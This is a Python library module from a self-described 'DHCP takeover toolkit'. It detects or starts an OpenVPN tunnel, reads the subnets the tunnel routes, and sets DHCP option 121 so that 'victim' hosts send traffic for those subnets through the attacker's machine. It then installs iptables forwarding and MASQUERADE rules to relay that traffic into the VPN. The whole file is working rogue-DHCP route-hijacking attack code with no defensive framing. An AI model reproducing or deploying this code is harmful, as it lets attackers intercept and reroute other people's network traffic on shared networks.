#!/usr/bin/env python3
# v2.0
"""
vpn_relay.py — selective VPN-subnet relay for the DHCP takeover toolkit (Linux).

This module does NOT build DHCP packets.  It only:
  1. Detects whether the host has an active VPN tunnel; if not, finds an OpenVPN
     autologin profile and starts OpenVPN.
  2. Reads the VPN subnets routed via the tunnel.
  3. Configures the option-121 policy on server_details so dhcp_takeover's single
     build_dhcp_response injects the right routes (no duplicated packet code).
  4. Installs Linux iptables rules so victim traffic destined for VPN subnets is
     MASQUERADEd through the tunnel, while all other traffic is left untouched
     (victims send it straight to the real router via the opt-121 default route).

Resulting victim traffic flows after our lease is accepted:

    VPN-bound (e.g. 10.8.0.0/24):
      victim -> (opt121 next-hop = our identity) -> host phys iface -> iptables
      -> MASQUERADE -> tun0 -> VPN server -> resource

    Internet (e.g. 8.8.8.8):
      victim -> (opt121 default = real router) -> internet
      (this host never sees the packet)

Public API (used by main.py):
    enable_vpn_relay(server_details, phys_iface) -> tun_iface | None
    teardown()        # also auto-registered via atexit / SIGINT / SIGTERM

Linux only.  Requires root, iptables, iproute2, and (if no tunnel is up) openvpn.
"""

import atexit
import glob
import ipaddress
import os
import signal
import subprocess
import sys
import time

from dhcp_takeover import print_step


# ── OpenVPN search paths ──────────────────────────────────────────────────────

OVPN_BINARY_PATHS = [
    "/usr/sbin/openvpn",
    "/usr/bin/openvpn",
    "/usr/local/sbin/openvpn",
    "/usr/local/bin/openvpn",
]

OVPN_PROFILE_DIRS = [
    os.path.expanduser("~/.config/OpenVPN Connect/profiles"),
    "/etc/openvpn",
    "/etc/openvpn/client",
    os.path.expanduser("~/.config/openvpn"),
    os.path.expanduser("~/openvpn"),
    ".",
]

OPENVPN_TUN_WAIT_TIMEOUT = 30  # seconds to wait for tun after starting OpenVPN


# ── Module-level state (mutated by setup; read by teardown) ──────────────────

_openvpn_proc = None          # subprocess.Popen if we started OpenVPN
_fwd_phys_iface = None
_fwd_tun_iface = None
_fwd_rules = []               # [(delete_flag_args, rule_args), ...] for teardown
_orig_ip_forward = None
_cleanup_registered = False
_cleanup_done = False


# ── VPN detection ─────────────────────────────────────────────────────────────

def detect_host_vpn():
    """Return the name of the first up tun/tap interface on this host, or None."""
    for state_path in sorted(
        glob.glob("/sys/class/net/tun*/operstate")
        + glob.glob("/sys/class/net/tap*/operstate")
    ):
        try:
            with open(state_path) as f:
                if f.read().strip() == "up":
                    return state_path.split("/")[4]
        except OSError:
            continue
    return None


def _wait_for_tun(timeout=OPENVPN_TUN_WAIT_TIMEOUT):
    """Poll until a tun/tap interface appears; return its name or None on timeout."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        iface = detect_host_vpn()
        if iface:
            return iface
        time.sleep(0.5)
    return None


# ── OpenVPN profile discovery + startup ───────────────────────────────────────

def find_ovpn_binary():
    """Return the path to the openvpn executable, or None if not found."""
    for p in OVPN_BINARY_PATHS:
        if os.path.isfile(p) and os.access(p, os.X_OK):
            return p
    result = subprocess.run(["which", "openvpn"], capture_output=True, text=True)
    if result.returncode == 0 and result.stdout.strip():
        return result.stdout.strip()
    return None


def _is_autologin_profile(path):
    """
    Return True if the profile contains 'auth-user-pass <file>'.

    Bare 'auth-user-pass' (no argument) triggers an interactive prompt we can't
    answer unattended.  'auth-user-pass /path/to/creds' embeds the credential
    file and needs no human input.
    """
    try:
        with open(path, errors="replace") as f:
            for line in f:
                stripped = line.strip()
                if stripped.startswith("auth-user-pass"):
                    return len(stripped.split()) >= 2  # has a filename argument
    except OSError:
        pass
    return False


def find_autologin_profiles(extra_dirs=()):
    """Return [(abs_path, mtime), ...] for autologin .ovpn profiles, newest-first."""
    dirs = list(OVPN_PROFILE_DIRS) + list(extra_dirs)
    found = {}
    for d in dirs:
        if not d:
            continue
        for p in glob.glob(os.path.join(d, "**", "*.ovpn"), recursive=True):
            found[os.path.abspath(p)] = os.path.getmtime(p)

    results = []
    for path, mtime in sorted(found.items(), key=lambda x: x[1], reverse=True):
        if _is_autologin_profile(path):
            results.append((path, mtime))
    return results


def start_openvpn_if_needed():
    """
    Ensure this host has an active VPN tunnel.

      1. If a tun/tap interface is already up, return it.
      2. Otherwise find autologin OpenVPN profiles.
      3. If a profile + openvpn binary exist, start OpenVPN with the newest
         profile and wait for the tun interface.
      4. Return the tun interface name, or None if no VPN could be established.
    """
    global _openvpn_proc

    tun = detect_host_vpn()
    if tun:
        print_step("OK", f"VPN already active on {tun}")
        return tun

    ovpn_bin = find_ovpn_binary()
    if not ovpn_bin:
        print_step("SKIP", "openvpn binary not found — no VPN relay")
        return None

    profiles = find_autologin_profiles()
    if not profiles:
        print_step("SKIP", "No autologin .ovpn profiles found — no VPN relay")
        return None

    profile_path, _ = profiles[0]
    print_step("START", f"Starting OpenVPN with autologin profile: {profile_path}")
    _openvpn_proc = subprocess.Popen(
        [ovpn_bin, "--config", profile_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.STDOUT,
    )
    print_step("OK", f"OpenVPN started (pid {_openvpn_proc.pid})")

    print_step("START", f"Waiting up to {OPENVPN_TUN_WAIT_TIMEOUT}s for tun interface...")
    tun = _wait_for_tun()
    if tun:
        print_step("OK", f"VPN tunnel up on {tun}")
    else:
        print_step("FAIL", "tun interface did not appear — no VPN relay")
    return tun


# ── VPN subnet extraction ─────────────────────────────────────────────────────

def get_vpn_subnets(tun_iface):
    """
    Return the IPv4 CIDR prefixes routed via tun_iface.

    These are the subnets the VPN server pushed into the host routing table
    (e.g. 10.8.0.0/24).  Default routes and non-routable ranges are excluded so
    the injected option 121 stays as narrow as possible.
    """
    try:
        result = subprocess.run(
            ["ip", "route", "show", "dev", tun_iface],
            capture_output=True,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        print_step("WARN", "'ip' command not found — cannot read VPN subnets")
        return []

    subnets = []
    for line in result.stdout.splitlines():
        parts = line.split()
        if not parts:
            continue
        prefix = parts[0]
        if prefix in ("default", "0.0.0.0/0"):
            continue
        try:
            net = ipaddress.IPv4Network(prefix, strict=False)
        except ValueError:
            continue
        if net.is_link_local or net.is_loopback or net.is_multicast:
            continue
        subnets.append(str(net))

    if subnets:
        print_step("OK", f"VPN subnets via {tun_iface}: {subnets}")
    else:
        print_step("WARN", f"No routable subnets found via {tun_iface}")
    return subnets


# ── Option 121 policy on server_details ───────────────────────────────────────

def configure_selective_relay(server_details, vpn_subnets):
    """Inject VPN subnets via our identity; keep a passthrough default route."""
    server_details["opt121_subnets"] = list(vpn_subnets)
    server_details["opt121_default_via_router"] = True
    print_step("OK", f"opt121 policy: relay {vpn_subnets} via us, default via real router")


def configure_passthrough(server_details):
    """No interception — victims get only a normal default route to the real router."""
    server_details["opt121_subnets"] = []
    server_details["opt121_default_via_router"] = True
    print_step("OK", "opt121 policy: passthrough only (default via real router)")


# ── Linux iptables forwarding ─────────────────────────────────────────────────

def _iptables(table_flag, args, *, check=True):
    """Run an iptables command; return True on success."""
    cmd = ["iptables"] + table_flag + args
    res = subprocess.run(cmd, capture_output=True, check=False)
    if res.returncode != 0 and check:
        print_step("WARN", f"iptables failed ({res.returncode}): {' '.join(cmd)}")
    return res.returncode == 0


def setup_victim_forwarding(phys_iface, tun_iface, vpn_subnets):
    """
    Enable kernel IP forwarding and MASQUERADE victim VPN traffic through tun.

    Per VPN subnet:
      nat POSTROUTING  -o <tun>  -d <subnet>  MASQUERADE
      FORWARD          -i <phys> -o <tun>  -d <subnet>  ACCEPT
    Once (shared return path):
      FORWARD          -i <tun>  -m state --state RELATED,ESTABLISHED  ACCEPT

    All rules are recorded in _fwd_rules for exact reversal at teardown.
    """
    global _fwd_phys_iface, _fwd_tun_iface, _orig_ip_forward

    _fwd_phys_iface = phys_iface
    _fwd_tun_iface = tun_iface

    try:
        with open("/proc/sys/net/ipv4/ip_forward") as f:
            _orig_ip_forward = f.read().strip()
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1\n")
        print_step("OK", "Enabled IPv4 forwarding")
    except OSError as exc:
        print_step("WARN", f"Could not set ip_forward: {exc}")

    for subnet in vpn_subnets:
        nat_rule = ["-o", tun_iface, "-d", subnet, "-j", "MASQUERADE"]
        fwd_rule = ["-i", phys_iface, "-o", tun_iface, "-d", subnet, "-j", "ACCEPT"]
        if _iptables(["-t", "nat", "-A", "POSTROUTING"], nat_rule):
            _fwd_rules.append((["-t", "nat", "-D", "POSTROUTING"], nat_rule))
        if _iptables(["-A", "FORWARD"], fwd_rule):
            _fwd_rules.append((["-D", "FORWARD"], fwd_rule))

    if vpn_subnets:
        return_rule = [
            "-i", tun_iface,
            "-m", "state", "--state", "RELATED,ESTABLISHED",
            "-j", "ACCEPT",
        ]
        if _iptables(["-A", "FORWARD"], return_rule):
            _fwd_rules.append((["-D", "FORWARD"], return_rule))

    print_step("OK", f"Forwarding installed: {phys_iface} → {tun_iface} for {vpn_subnets}")


# ── High-level entry point ────────────────────────────────────────────────────

def enable_vpn_relay(server_details, phys_iface):
    """
    Detect/start the VPN, configure option 121, and install forwarding.

    Returns the tun interface name if selective relay is active, else None
    (passthrough mode).  Registers cleanup on first successful setup.
    """
    _register_cleanup()

    tun = start_openvpn_if_needed()
    if not tun:
        configure_passthrough(server_details)
        return None

    vpn_subnets = get_vpn_subnets(tun)
    if not vpn_subnets:
        print_step("SKIP", "VPN up but no routable subnets — passthrough only")
        configure_passthrough(server_details)
        return None

    configure_selective_relay(server_details, vpn_subnets)
    setup_victim_forwarding(phys_iface, tun, vpn_subnets)
    return tun


# ── Cleanup ───────────────────────────────────────────────────────────────────

def teardown():
    """Remove iptables rules, restore ip_forward, and stop OpenVPN if we started it."""
    global _fwd_rules, _orig_ip_forward, _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True

    for table_flag, args in reversed(_fwd_rules):
        _iptables(table_flag, args, check=False)
    _fwd_rules = []

    if _orig_ip_forward is not None:
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(_orig_ip_forward + "\n")
        except OSError:
            pass
        _orig_ip_forward = None
        print_step("OK", "Restored ip_forward")

    if _openvpn_proc is not None and _openvpn_proc.poll() is None:
        _openvpn_proc.terminate()
        try:
            _openvpn_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            _openvpn_proc.kill()
        print_step("OK", "Stopped OpenVPN process")

    print_step("OK", "VPN relay teardown complete")


def _register_cleanup():
    global _cleanup_registered
    if _cleanup_registered:
        return
    _cleanup_registered = True
    atexit.register(teardown)
    # Chain signal handlers so a Ctrl+C tears down forwarding before exit.
    for sig in (signal.SIGTERM, signal.SIGINT):
        try:
            signal.signal(sig, lambda *_: (teardown(), sys.exit(0)))
        except (ValueError, OSError):
            # signal() only works in the main thread; ignore if unavailable.
            pass


if __name__ == "__main__":
    print_step(
        "FAIL",
        "vpn_relay.py is a library module. Run the toolkit via:  sudo python3 main.py",
    )
